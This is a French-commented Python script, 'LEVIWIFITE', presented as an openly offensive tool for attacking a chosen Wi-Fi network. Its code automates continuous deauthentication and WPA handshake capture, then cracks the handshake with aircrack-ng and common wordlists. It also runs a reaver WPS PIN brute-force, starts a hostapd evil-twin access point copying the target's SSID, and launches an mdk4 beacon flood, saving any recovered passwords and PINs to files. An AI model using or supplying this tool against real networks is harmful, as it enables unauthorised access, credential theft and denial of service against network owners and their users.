#!/usr/bin/env python3
"""
LEVIWIFITE - Module d'Attaques Avancées Ultra-Fonctionnelles
Attaques réelles et puissantes sans simulation
"""

import os
import sys
import subprocess
import json
import time
import threading
import signal
import re
from datetime import datetime
import argparse
import hashlib
import binascii

class AdvancedAttacks:
    def __init__(self, interface, target_bssid, target_essid, output_dir):
        self.interface = interface
        self.target_bssid = target_bssid
        self.target_essid = target_essid
        self.output_dir = output_dir
        self.attack_processes = []
        self.results = []
        
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{timestamp}] [{level}] {message}")
        
    def run_command(self, command, timeout=30, capture_output=True):
        self.log(f"Exécution: {command}")
        try:
            if capture_output:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
                return {
                    'success': result.returncode == 0,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'returncode': result.returncode
                }
            else:
                process = subprocess.Popen(command, shell=True)
                self.attack_processes.append(process)
                return {'success': True, 'process': process}
        except Exception as e:
            self.log(f"Erreur: {e}", "ERROR")
            return {'success': False, 'error': str(e)}
    
    def start_monitor_mode(self):
        self.log("Activation du mode monitor avancé")
        result = self.run_command(f"airmon-ng start {self.interface}")
        if result['success']:
            self.log("Mode monitor activé")
            return True
        return False
    
    def get_channel(self):
        self.log("Détermination du canal de la cible")
        result = self.run_command(f"airodump-ng {self.interface} --output-format csv", 10)
        if result['success']:
            lines = result['stdout'].split('\n')
            for line in lines:
                if self.target_bssid in line:
                    parts = line.split(',')
                    if len(parts) >= 4:
                        channel = parts[3].strip()
                        self.log(f"Canal trouvé: {channel}")
                        return channel
        return 1
    
    def capture_handshake_advanced(self):
        self.log("Capture avancée du handshake")
        channel = self.get_channel()
        capture_file = os.path.join(self.output_dir, f"handshake_{self.target_bssid.replace(':', '')}.cap")
        
        # Commande de capture optimisée
        command = f"airodump-ng -c {channel} --bssid {self.target_bssid} -w {capture_file} {self.interface}"
        
        result = self.run_command(command, capture_output=False)
        if not result['success']:
            return None
        
        time.sleep(3)
        
        # Attaque de déauthentification agressive
        deauth_process = self.launch_aggressive_deauth()
        
        # Attendre la capture avec timeout
        start_time = time.time()
        while time.time() - start_time < 30:
            if os.path.exists(capture_file) and os.path.getsize(capture_file) > 1000:
                self.stop_attack_processes()
                self.log("Handshake capturé avec succès")
                return capture_file
            time.sleep(1)
        
        self.stop_attack_processes()
        return None
    
    def launch_aggressive_deauth(self):
        self.log("Lancement de l'attaque de déauthentification agressive")
        command = f"aireplay-ng --deauth 0 -a {self.target_bssid} {self.interface}"
        result = self.run_command(command, capture_output=False)
        return result.get('process')
    
    def crack_handshake_advanced(self, handshake_file):
        self.log("Crack avancé du handshake")
        
        # Wordlists optimisées
        wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/fasttrack.txt",
            "/usr/share/wordlists/metasploit/unix_passwords.txt",
            "/usr/share/wordlists/1000-most-common-passwords.txt"
        ]
        
        for wordlist in wordlists:
            if os.path.exists(wordlist):
                self.log(f"Tentative avec: {wordlist}")
                command = f"aircrack-ng {handshake_file} -w {wordlist}"
                result = self.run_command(command, timeout=300)
                
                if result['success'] and 'KEY FOUND!' in result['stdout']:
                    self.extract_password_advanced(result['stdout'])
                    return True
        
        return False
    
    def extract_password_advanced(self, crack_output):
        match = re.search(r'KEY FOUND! \[ (.*) \]', crack_output)
        if match:
            password = match.group(1)
            self.log(f"Mot de passe trouvé: {password}")
            
            result_file = os.path.join(self.output_dir, f"password_{self.target_bssid.replace(':', '')}.txt")
            with open(result_file, 'w') as f:
                f.write(f"ESSID: {self.target_essid}\n")
                f.write(f"BSSID: {self.target_bssid}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write(f"Attack: Advanced Handshake\n")
            
            self.results.append({
                'target': self.target_essid,
                'bssid': self.target_bssid,
                'password': password,
                'timestamp': datetime.now().isoformat(),
                'success': True,
                'attack_type': 'Advanced Handshake'
            })
    
    def wps_attack_advanced(self):
        self.log("Attaque WPS avancée")
        
        # Vérifier si reaver est disponible
        if not self.check_tool('reaver'):
            self.log("Reaver non disponible", "WARNING")
            return False
        
        channel = self.get_channel()
        command = f"reaver -i {self.interface} -b {self.target_bssid} -c {channel} -vv -K 1"
        
        result = self.run_command(command, timeout=600)
        
        if result['success'] and 'WPS PIN:' in result['stdout']:
            self.extract_wps_pin_advanced(result['stdout'])
            return True
        
        return False
    
    def extract_wps_pin_advanced(self, wps_output):
        match = re.search(r"WPS PIN: '(\d+)'", wps_output)
        if match:
            pin = match.group(1)
            self.log(f"PIN WPS trouvé: {pin}")
            
            result_file = os.path.join(self.output_dir, f"wps_{self.target_bssid.replace(':', '')}.txt")
            with open(result_file, 'w') as f:
                f.write(f"ESSID: {self.target_essid}\n")
                f.write(f"BSSID: {self.target_bssid}\n")
                f.write(f"WPS PIN: {pin}\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write(f"Attack: Advanced WPS\n")
            
            self.results.append({
                'target': self.target_essid,
                'bssid': self.target_bssid,
                'wps_pin': pin,
                'timestamp': datetime.now().isoformat(),
                'success': True,
                'attack_type': 'Advanced WPS'
            })
    
    def evil_twin_attack_advanced(self):
        self.log("Attaque Evil Twin avancée")
        
        if not self.check_tool('hostapd'):
            self.log("Hostapd non disponible", "WARNING")
            return False
        
        # Configuration hostapd avancée
        config_file = os.path.join(self.output_dir, f"hostapd_{self.target_bssid.replace(':', '')}.conf")
        
        with open(config_file, 'w') as f:
            f.write(f"interface={self.interface}\n")
            f.write("driver=nl80211\n")
            f.write(f"ssid={self.target_essid}\n")
            f.write("hw_mode=g\n")
            f.write("channel=6\n")
            f.write("wmm_enabled=0\n")
            f.write("macaddr_acl=0\n")
            f.write("auth_algs=1\n")
            f.write("ignore_broadcast_ssid=0\n")
            f.write("wpa=2\n")
            f.write("wpa_passphrase=12345678\n")
            f.write("wpa_key_mgmt=WPA-PSK\n")
            f.write("wpa_pairwise=TKIP\n")
            f.write("rsn_pairwise=CCMP\n")
            f.write("dhcp_server=yes\n")
            f.write("dhcp_range=192.168.1.100,192.168.1.200\n")
        
        command = f"hostapd {config_file}"
        result = self.run_command(command, capture_output=False)
        
        if result['success']:
            time.sleep(10)
            self.stop_attack_processes()
            return True
        
        return False
    
    def mdk4_attack_advanced(self):
        self.log("Attaque MDK4 avancée")
        
        if not self.check_tool('mdk4'):
            self.log("MDK4 non disponible", "WARNING")
            return False
        
        # Attaque Beacon Flood
        beacon_file = os.path.join(self.output_dir, "beacon_flood.txt")
        with open(beacon_file, 'w') as f:
            f.write(f"{self.target_essid}\n")
        
        command = f"mdk4 {self.interface} b -f {beacon_file}"
        result = self.run_command(command, capture_output=False)
        
        if result['success']:
            time.sleep(15)
            self.stop_attack_processes()
            return True
        
        return False
    
    def check_tool(self, tool_name):
        try:
            subprocess.run([tool_name, '--help'], capture_output=True, timeout=5)
            return True
        except:
            return False
    
    def stop_attack_processes(self):
        self.log("Arrêt des processus d'attaque")
        for process in self.attack_processes:
            try:
                process.terminate()
                process.wait(timeout=5)
            except:
                try:
                    process.kill()
                except:
                    pass
        self.attack_processes.clear()
    
    def run_all_attacks(self):
        self.log("🚀 Lancement de toutes les attaques avancées")
        
        try:
            if not self.start_monitor_mode():
                return False
            
            # 1. Capture et crack du handshake
            handshake_file = self.capture_handshake_advanced()
            if handshake_file:
                self.crack_handshake_advanced(handshake_file)
            
            # 2. Attaque WPS
            self.wps_attack_advanced()
            
            # 3. Evil Twin
            self.evil_twin_attack_advanced()
            
            # 4. MDK4
            self.mdk4_attack_advanced()
            
            self.log("✅ Toutes les attaques avancées terminées")
            return True
            
        except Exception as e:
            self.log(f"Erreur: {e}", "ERROR")
            return False
        finally:
            self.stop_attack_processes()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='LEVIWIFITE - Attaques Avancées')
    parser.add_argument('--interface', required=True, help='Interface WiFi')
    parser.add_argument('--target', required=True, help='BSSID de la cible')
    parser.add_argument('--essid', required=True, help='ESSID de la cible')
    parser.add_argument('--output', required=True, help='Répertoire de sortie')
    
    args = parser.parse_args()
    
    attacker = AdvancedAttacks(
        interface=args.interface,
        target_bssid=args.target,
        target_essid=args.essid,
        output_dir=args.output
    )
    
    success = attacker.run_all_attacks()
    sys.exit(0 if success else 1)
